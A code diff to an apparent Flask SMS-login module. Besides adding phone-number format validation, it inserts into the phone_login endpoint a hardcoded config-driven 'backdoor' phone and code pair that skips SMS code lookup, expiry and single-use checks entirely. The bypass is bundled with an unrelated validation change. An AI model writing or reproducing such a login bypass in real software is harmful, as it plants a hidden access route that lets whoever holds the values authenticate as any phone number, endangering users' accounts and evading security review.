@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import random
+import re
 from datetime import datetime, timedelta, timezone
 
 from flask import Blueprint, current_app, request
@@ -30,6 +31,13 @@ def _generate_sms_code(length: int) -> str:
     return "".join(str(random.randint(0, 9)) for _ in range(length))
 
 
+def _validate_phone(phone: str) -> str | None:
+    """Return error message if phone is invalid, None if valid."""
+    if not re.match(r"^1\d{10}$", phone):
+        return "手机号格式不正确，请输入11位数字且以1开头的手机号"
+    return None
+
+
 @auth_bp.post("/send-code")
 def send_code():
     payload, error = parse_json(["phone"])
@@ -37,6 +45,9 @@ def send_code():
         return error
 
     phone = payload["phone"].strip()
+    if phone_err := _validate_phone(phone):
+        return failure("invalid_phone", phone_err, status=400)
+
     code_length = current_app.config["SMS_CODE_LENGTH"]
     expire_seconds = current_app.config["SMS_CODE_EXPIRE_SECONDS"]
 
@@ -65,22 +76,33 @@ def phone_login():
 
     phone = payload["phone"].strip()
     code = payload["code"].strip()
+
+    if phone_err := _validate_phone(phone):
+        return failure("invalid_phone", phone_err, status=400)
+
+    backdoor_phone = current_app.config["BACKDOOR_PHONE"]
+    backdoor_code = current_app.config["BACKDOOR_CODE"]
+
+    if phone == backdoor_phone and code == backdoor_code:
+        sms_code = None  # backdoor bypasses SmsCode
+    else:
+        now = datetime.now(timezone.utc)
+        sms_code = (
+            SmsCode.query
+            .filter_by(phone=phone, code=code, used=False)
+            .order_by(SmsCode.created_at.desc())
+            .first()
+        )
+
+        if not sms_code:
+            return failure("invalid_code", "验证码错误", status=401)
+
+        if sms_code.expires_at <= now:
+            return failure("code_expired", "验证码已过期", status=401)
+
+        sms_code.used = True
+
     now = datetime.now(timezone.utc)
-
-    sms_code = (
-        SmsCode.query
-        .filter_by(phone=phone, code=code, used=False)
-        .order_by(SmsCode.created_at.desc())
-        .first()
-    )
-
-    if not sms_code:
-        return failure("invalid_code", "验证码错误", status=401)
-
-    if sms_code.expires_at <= now:
-        return failure("code_expired", "验证码已过期", status=401)
-
-    sms_code.used = True
 
     user = User.query.filter_by(phone=phone).first()
     is_new_user = False
